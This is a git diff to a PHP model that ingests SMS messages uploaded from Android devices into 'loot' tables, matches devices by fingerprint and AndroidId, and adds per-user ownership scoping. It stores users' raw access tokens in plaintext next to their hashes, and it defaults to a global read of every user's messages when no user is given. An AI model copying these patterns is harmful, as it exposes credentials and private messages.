@@ -86,7 +86,8 @@ class ModUploads extends Model
         string $loot_uuid,
         string $loot_owner,
         string $loot_device,
-        string $dated
+        string $dated,
+        ?int $userId = null
     ): array {
         try {
             $this->db->transBegin();
@@ -105,14 +106,16 @@ class ModUploads extends Model
                 $smsData,
                 $loot_uuid,
                 $loot_owner,
-                $loot_device
+                $loot_device,
+                $userId
             );
 
             // 5. Save summary (throws on failure)
             $this->save_summary_data(
                 $processed['counters'],
                 $loot_uuid,
-                $dated
+                $dated,
+                $userId
             );
 
             if ($this->db->transStatus() === false) {
@@ -153,17 +156,28 @@ class ModUploads extends Model
     }
 
     /**
-     * Find an existing device by stable fingerprint fields (not the per-request UUID).
+     * Find an existing device by stable identity fields (not the per-request UUID).
+     * Matches on the composite device_Fingerprint first, then falls back to the
+     * AndroidId (covers devices registered before the composite fingerprint), and
+     * finally to model + brand for legacy/custom-ROM devices with no fingerprint.
      */
     public function device_find_by_fingerprint(
         string $fingerprint,
         string $model = '',
-        string $brand = ''
+        string $brand = '',
+        string $androidId = ''
     ): array {
         $builder = $this->db->table('tbl_Devices')->select('device_Uuid');
 
         if ($fingerprint !== '') {
-            $builder->where('device_Fingerprint', $fingerprint);
+            $builder->groupStart()
+                ->where('device_Fingerprint', $fingerprint);
+            if ($androidId !== '') {
+                $builder->orWhere('device_AndroidId', $androidId);
+            }
+            $builder->groupEnd();
+        } elseif ($androidId !== '') {
+            $builder->where('device_AndroidId', $androidId);
         } else {
             // Fallback when fingerprint is empty (rare / custom ROMs)
             $builder->where('device_Model', $model)
@@ -236,6 +250,62 @@ class ModUploads extends Model
             'device_name' => $deviceName,
             'created_at' => date('Y-m-d H:i:s')
         ]);
+    }
+
+    /**
+     * Resolve every raw access-token string that owns data for the given user.
+     *
+     * tbl_Sms.sms_owner and tbl_Loot.loot_Owner store the RAW token, while
+     * auth_identities.secret stores its SHA-256 hash, so the match is:
+     *   auth_identities.secret = SHA2(raw_token, 256)
+     */
+    public function getOwnedRawTokens(int $userId): array
+    {
+        $tokenType = \CodeIgniter\Shield\Authentication\Authenticators\AccessTokens::ID_TYPE_ACCESS_TOKEN;
+
+        $rawTokens = [];
+        $tokenRows = $this->db->query("
+            SELECT DISTINCT s.sms_owner AS tk FROM tbl_Sms s
+            INNER JOIN auth_identities i ON i.secret = SHA2(s.sms_owner, 256)
+            WHERE i.user_id = ? AND i.type = ?
+            UNION
+            SELECT DISTINCT l.loot_Owner AS tk FROM tbl_Loot l
+            INNER JOIN auth_identities i ON i.secret = SHA2(l.loot_Owner, 256)
+            WHERE i.user_id = ? AND i.type = ?
+        ", [$userId, $tokenType, $userId, $tokenType])->getResult();
+
+        foreach ($tokenRows as $r) {
+            if (!empty($r->tk)) $rawTokens[] = $r->tk;
+        }
+
+        return $rawTokens;
+    }
+
+    /**
+     * Count the upload batches (tbl_Loot rows) owned by a user.
+     */
+    public function countUploadsForUser(int $userId): int
+    {
+        $tokens = $this->getOwnedRawTokens($userId);
+        if (empty($tokens)) return 0;
+
+        return $this->db->table('tbl_Loot')->whereIn('loot_Owner', $tokens)->countAllResults();
+    }
+
+    /**
+     * Constrain a builder to the SMS rows owned by the given user.
+     * When $userId is null no constraint is applied (global read).
+     */
+    protected function applyOwnerScope(object $builder, ?int $userId, string $ownerCol = 's.sms_owner'): void
+    {
+        if ($userId === null) return;
+
+        $tokens = $this->getOwnedRawTokens($userId);
+        if (empty($tokens)) {
+            $builder->where('1 = 0');
+        } else {
+            $builder->whereIn($ownerCol, $tokens);
+        }
     }
 
     /**
@@ -905,7 +975,8 @@ class ModUploads extends Model
         array $smsData,
         string $uuid,
         string $owner,
-        string $device
+        string $device,
+        ?int $userId = null
     ): array {
         // Process ALL SMS equally — no MPESA-specific filter or pattern matching
         $inserted = 0;
@@ -928,7 +999,8 @@ class ModUploads extends Model
                     'sms_body' => $smsBody,
                     'sms_loot_source' => $uuid,
                     'sms_owner' => $owner,
-                    'sms_device' => $device
+                    'sms_device' => $device,
+                    'sms_user_id' => $userId
                 ];
             }
 
@@ -956,6 +1028,7 @@ class ModUploads extends Model
                 'is_finance' => 0,
                 'method'     => 'upload',
                 'confidence' => 0.5000,
+                'user_id'    => $userId,
                 'created_at' => date('Y-m-d H:i:s'),
             ];
             $idx++;
@@ -994,7 +1067,7 @@ class ModUploads extends Model
     /**
      * Save upload summary — total SMS count + LLM direction/transaction_type breakdowns.
      */
-    protected function save_summary_data(array $counters, string $uuid, int|string $date): bool {
+    protected function save_summary_data(array $counters, string $uuid, int|string $date, ?int $userId = null): bool {
         // Compute direction breakdown from classified SMS for this loot
         $directionBreakdown = $this->get_direction_breakdown_for_loot($uuid);
         $transactionTypeBreakdown = $this->get_transaction_type_breakdown_for_loot($uuid);
@@ -1005,6 +1078,7 @@ class ModUploads extends Model
             'loot_Created'            => is_numeric($date) ? date('Y-m-d H:i:s', (int)$date) : $date,
             'direction_breakdown'     => json_encode($directionBreakdown),
             'transaction_type_breakdown' => json_encode($transactionTypeBreakdown),
+            'user_id'                 => $userId,
         ];
 
         $ok = $this->db->table('tbl_Loot_Summary')->insert($summary);
